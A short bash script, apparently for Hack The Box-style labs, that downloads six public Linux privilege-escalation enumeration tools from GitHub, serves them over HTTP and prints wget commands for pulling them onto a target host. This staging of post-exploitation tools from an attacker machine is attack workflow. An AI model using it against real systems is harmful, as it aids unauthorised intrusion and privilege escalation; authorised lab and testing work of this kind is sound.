#!/bin/bash

if [ ! -f "linpeas.sh" ]; then
  wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
  chmod 700 linpeas.sh
  wget "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" -O suid3num.py
  chmod 700 suid3num.py
  wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh
  chmod 700 linenum.sh
  wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
  chmod 700 lse.sh
  wget "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O les.sh
  chmod 700 les.sh
  wget "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py
  chmod 700 linuxprivchecker.py
fi

htbip=$(ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)

echo ""
echo "You can download any of these tools on your target using commands below:"
echo ""
echo "wget http://$htbip/linpeas.sh; chmod +x linpeas.sh"
echo "wget http://$htbip/suid3num.py; chmod +x suid3num.py"
echo "wget http://$htbip/linenum.sh; chmod +x linenum.sh"
echo "wget http://$htbip/lse.sh; chmod +x lse.sh"
echo "wget http://$htbip/les.sh; chmod +x les.sh"
echo "wget http://$htbip/linuxprivchecker.py; chmod +x linuxprivchecker.py"
echo ""

sudo python3 -m http.server 80